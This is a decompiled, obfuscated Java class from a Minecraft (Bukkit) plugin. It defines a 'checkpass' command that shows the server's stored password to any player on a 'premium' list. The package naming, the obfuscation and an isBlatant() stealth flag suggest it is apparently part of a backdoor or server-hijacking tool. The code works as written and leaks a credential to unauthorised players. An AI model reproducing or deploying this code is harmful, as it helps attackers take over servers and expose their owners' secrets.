/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class CheckpassCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllllIIlIlllIIIIIIlIlI, String lllllllllllllllIIlIlllIIIIIIllIl, String[] lllllllllllllllIIlIlllIIIIIIllII, Player lllllllllllllllIIlIlllIIIIIIlIIl) {
        if (lllllllllllllllIIlIlllIIIIIIlIlI.premium.contains(lllllllllllllllIIlIlllIIIIIIlIIl.getName())) {
            if (DataManager.getData().getBoolean("hasPass")) {
                lllllllllllllllIIlIlllIIIIIIlIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The password for this server is ").append(Settings.RED).append(DataManager.getData().getString("pass")))));
            } else {
                lllllllllllllllIIlIlllIIIIIIlIIl.sendMessage(Settings.PREFIX("This server doesn't have a password set"));
            }
        } else {
            lllllllllllllllIIlIlllIIIIIIlIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a premium ").append(Settings.RED).append("user ").append(Settings.WHITE).append("to execute this command"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    public CheckpassCommand() {
        CheckpassCommand lllllllllllllllIIlIlllIIIIIlIIlI;
    }
}

